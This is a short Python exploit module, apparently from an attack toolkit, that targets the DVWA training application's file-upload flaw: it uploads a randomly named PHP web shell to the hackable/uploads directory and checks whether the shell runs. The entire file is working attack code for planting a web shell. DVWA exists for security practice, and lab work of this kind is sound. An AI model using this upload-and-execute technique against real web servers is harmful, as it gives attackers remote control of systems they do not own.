
from urllib.parse import urljoin , urlparse 
from core.common import *

def exploit(url,cookies = {}):
    print("\nTry Dvwa Upload exploit :")

    print("\tUpload shell :")
    shell_name = random_shell_name()
    shell = php_shell()
    
    if upload_file(url,cookies,shell_name,shell):
        shell_path = urljoin(url, 'hackable/uploads/' + shell_name)
        check_exploit_succeed(shell_path,makeHeaders(urlparse(url).hostname),end='\t')

    else:
        print("\tFailed upload file !!")
